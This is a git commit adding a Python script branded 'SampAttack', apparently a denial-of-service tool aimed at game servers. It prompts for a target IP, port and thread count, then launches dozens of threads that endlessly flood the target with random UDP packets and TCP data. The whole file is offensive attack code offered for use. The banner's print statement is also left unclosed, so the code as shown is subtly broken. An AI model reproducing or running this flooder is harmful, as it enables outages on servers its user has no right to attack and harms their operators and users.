d97869519512552a6379318c5a0912700c404095
BimzzxNextGeneration <110216086+BimzzxNextGeneration@users.noreply.github.com>
2022-08-01 16:50:42 +0700

    Add files via upload

---
+++ z.py
@@ -0,0 +1,389 @@
+import os, sys, time, socket, random, threading
+
+sys.stdout.write("\x1b]2;[@] SampAttack. | Username : [*****] | Password : [*****] | Online User : [Bimzzx (1)]\x07")
+os.system('cls' if os.name == 'nt' else 'clear')
+print("""
+                      ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔╦╗╔═╗╔═╗
+                      ╚═╗╠═╣║║║╠═╝   ║║ ║║║ ║╚═╗
+                      ╚═╝╩ ╩╩ ╩╩    ═╩╝═╩╝╚═╝╚═╝
+Code By Bimzzx...
+PrivateTools!!"""
+ip = str(input("IP / HOST : "))
+port = int(input("PORT : "))
+times = int(input("TIMES (7500) : "))
+threads = int(input("THREADS (2800) : "))
+os.system('cls' if os.name == 'nt' else 'clear')
+
+def destroy():
+	data = random._urandom(818)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def destroyx():
+	data = random._urandom(1306)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def destroyxx():
+	data = random._urandom(1180)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def destroyxxx():
+	data = random._urandom(1031)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def attack():
+	data = random._urandom(1050)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def attackx():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def attackxx():
+	data = random._urandom(999)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def attackxxx():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def run():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def runx():
+	data = random._urandom(1049)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def runxx():
+	data = random._urandom(1490)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def runxxx():
+	data = random._urandom(1800)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def xxx():
+	data = random._urandom(1081)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
+
+def start():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startx():
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxx():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxx():
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxx():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxx():
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxx():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxxx():
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxxxx():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxxxxx():
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxxxxxx():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxxxxxxx():
+    data = random._urandom(666)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+def startxxxxxxxxxxxx():
+    data = random._urandom(1081)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range (times):
+                s.send(data)
+            print("Server Has Been Crashhed")
+        except :
+            s.close()
+            print("Server Has Been Maintenace")
+
+for _f in range(threads):
+	threading.Thread(target=start).start()
+	threading.Thread(target=startx).start()
+	threading.Thread(target=startxx).start()
+	threading.Thread(target=startxxx).start()
+	threading.Thread(target=startxxxx).start()
+	threading.Thread(target=startxxxxx).start()
+	threading.Thread(target=startxxxxxx).start()
+	threading.Thread(target=startxxxxxxx).start()
+	threading.Thread(target=startxxxxxxxx).start()
+	threading.Thread(target=startxxxxxxxxx).start()
+	threading.Thread(target=startxxxxxxxxxx).start()
+	threading.Thread(target=startxxxxxxxxxxx).start()
+	threading.Thread(target=startxxxxxxxxxxxx).start()
+
+for _o in range(threads):
+	threading.Thread(target=xxx).start()
+
+for _i in range(threads):
+	threading.Thread(target=destroy).start()
+	threading.Thread(target=destroyx).start()
+	threading.Thread(target=destroyxx).start()
+	threading.Thread(target=destroyxxx).start()
+
+for _x in range(threads):
+	threading.Thread(target=attack).start()
+	threading.Thread(target=attackx).start()
+	threading.Thread(target=attackxx).start()
+	threading.Thread(target=attackxxx).start()
+
+for _y in range(threads):
+	threading.Thread(target=run).start()
+	threading.Thread(target=runx).start()
+	threading.Thread(target=runxx).start()
+	threading.Thread(target=runxxx).start()
